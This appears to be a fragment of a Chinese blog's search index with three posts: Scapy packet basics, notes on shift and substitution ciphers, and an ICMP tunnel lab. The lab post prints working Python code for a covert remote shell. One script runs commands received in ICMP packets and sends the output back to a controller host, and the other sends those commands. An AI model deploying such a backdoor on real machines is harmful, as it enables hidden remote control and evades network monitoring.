class="hljs-string">&quot;temp.cap&quot;</span>)<span class="hljs-comment">#读数据包</span><br></code></pre></td></tr></table></figure><h2 id="发送数据包，只发不收，用来攻击"><a href="#发送数据包，只发不收，用来攻击" class="headerlink" title="发送数据包，只发不收，用来攻击"></a>发送数据包，只发不收，用来攻击</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">sendp(pkt)<span class="hljs-comment">#发送Ether数据包(如果想发送给一个IP地址)</span><br>send(pkt)<span class="hljs-comment">#发送IP数据包（发送给一个MAC地址）</span><br></code></pre></td></tr></table></figure><h2 id="发送并接收数据包"><a href="#发送并接收数据包" class="headerlink" title="发送并接收数据包"></a>发送并接收数据包</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">sr(pkt)<span class="hljs-comment">#发送IP数据包</span><br>ans,uans=sr(pkt)<span class="hljs-comment">#ans储存收到应答的包和其对应的应答包，uans储存未收到应答的包</span><br>ans.summary()<span class="hljs-comment">#查看简洁信息</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">sr1(pkt)<span class="hljs-comment">#发送IP数据包，只返回一个应答数据包</span><br>ans=sr(pkt)<span class="hljs-comment">#没有uans</span><br>ans.summary()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">ans=srp(pkt)<span class="hljs-comment">#发送MAC数据包</span><br><span class="hljs-built_in">print</span>(ans)<span class="hljs-comment">#因为返回的是元组，直接打印，不能summary</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Scapy</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>密码学原理与实践1</title>
    <link href="/posts/3b59389d.html"/>
    <url>/posts/3b59389d.html</url>
    
    <content type="html"><![CDATA[<h2 id="密码学原理与实践学习"><a href="#密码学原理与实践学习" class="headerlink" title="密码学原理与实践学习"></a>密码学原理与实践学习</h2><p>$$<br>\mathcal{P}为明文(plaintext)\<br>\mathcal{C}或者\mathcal{\Large{e}}为密文(ciphertext)\<br>\mathcal{K}为密钥(key)\<br>$$</p><p><img src="https://img-blog.csdnimg.cn/c9bb6ffb7633458989625379e34beb2b.png"></p><h2 id="移位密码"><a href="#移位密码" class="headerlink" title="移位密码"></a>移位密码</h2><p><img src="https://img-blog.csdnimg.cn/6063701cdef74c6aaee0f0f49d4c005c.png"></p><p>在移位密码的集合中<br>$$<br>\mathcal P +\mathcal K &#x3D; \mathcal C\<br>即(\mathcal{P+K}) mod m等于\mathcal C mod m\<br>左右减 \mathcal K\<br>\mathcal{P &#x3D; C - K}\<br>这样就可以解释当\mathcal K作为密钥，加密\mathcal P得到的\mathcal C可以减\mathcal K再modm可以得到\mathcal P\<br>$$</p><h2 id="代换密码"><a href="#代换密码" class="headerlink" title="代换密码"></a>代换密码</h2><p><img src="https://img-blog.csdnimg.cn/e55eab28a36443bfba84f659ffaf86c2.png"></p>]]></content>
    
    
    <categories>
      
      <category>密码学原理与实践（第三版）</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Scapy1</title>
    <link href="/posts/9d02ecd4.html"/>
    <url>/posts/9d02ecd4.html</url>
    
    <content type="html"><![CDATA[<h2 id="ICMP隧道实验"><a href="#ICMP隧道实验" class="headerlink" title="ICMP隧道实验"></a>ICMP隧道实验</h2><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg3ODY3MzcwMQ==&mid=2247486951&idx=1&sn=731dc833298b30c3b3527f3148ee8466&chksm=cf1167adf866eebb4ae6767b988c3a6b7a7f322458cdf470535ae85824333256bc5b5115944e&mpshare=1&scene=23&srcid=0530PPADsKrPbGwUgbIkqet0&sharer_sharetime=1653888090547&sharer_shareid=76041939239261ee79b0f72c0d0ecd22#rd">原文链接</a><br>想做一下这个实验，网上也有工具实现，但是想自己编程<br><a href="https://xz.aliyun.com/t/7875">工具链接</a><br>看原文python代码中用了socket，但是我们用scapy模块实验一下<br>现在用一下<a href="https://blog.csdn.net/weixin_33623134/article/details/112490254">这个师傅的代码</a>，不过有的地方要改一下才能运行。</p><p>被控端源代码原理为<br>监听ICMP包，把data放到到一个变量，命令执行它<br>控制端源代码原理为<br>发送ICMP包把命令字符串放到data里面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment">#被控端</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment"># wait for the ICMP message containing the command from the C2 server</span><br>        <span class="hljs-comment"># to be received</span><br>        rx = sniff(<span class="hljs-built_in">filter</span>=<span class="hljs-string">&quot;icmp&quot;</span>, count=<span class="hljs-number">1</span>)<br>        <span class="hljs-comment"># strip down the packet to the payload itself</span><br>        var = rx[<span class="hljs-number">0</span>][Raw].load.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        <span class="hljs-comment"># run the command and save the result</span><br>        <span class="hljs-built_in">print</span>(var)<br>        res = os.popen(var).read()<br>        <span class="hljs-comment"># build the ICMP packet with the result as the payload</span><br>        send(IP(dst=<span class="hljs-string">&quot;XXXXXXXXXX&quot;</span>)/ICMP(<span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;echo-reply&quot;</span>, <span class="hljs-built_in">id</span>=<span class="hljs-number">0x0001</span>, seq=<span class="hljs-number">0x1</span>)/res)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> scapy.layers.inet <span class="hljs-keyword">import</span> ICMP<br><span class="hljs-comment">#控制端</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        command = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;# Enter command: &#x27;</span>)<br>        pinger = IP(dst=<span class="hljs-string">&quot;XXXXXXXXXX&quot;</span>)/ICMP(<span class="hljs-built_in">id</span>=<span class="hljs-number">0x0001</span>, seq=<span class="hljs-number">0x1</span>)/command<br>        send(pinger)<br>        rx = sniff(count=<span class="hljs-number">1</span>, timeout=<span class="hljs-number">2</span>)<br>        <span class="hljs-built_in">print</span>(rx[<span class="hljs-number">0</span>].load.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>        <span class="hljs-comment">#把原来的rx[0][Raw].load.decode(&#x27;utf-8&#x27;)</span><br>        <span class="hljs-comment">#凭感觉改成rx[0].load.decode(&#x27;utf-8&#x27;)</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>我的实验的被控端是kali虚拟机，网络设置为桥接模式。<br>看一下IP，把它填到控制端代码IP的dst里面<br>我的控制端是Windows，同理，把它的IP填到被控端代码里面</p><p><img src="https://img-blog.csdnimg.cn/8826b1a4697a49d9a7bc3b8a569c8dd1.png"></p><p>如图有可能有解码错误，以后研究一下为什么</p>]]></content>
    
    
    <categories>
      
      <category>Scapy</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
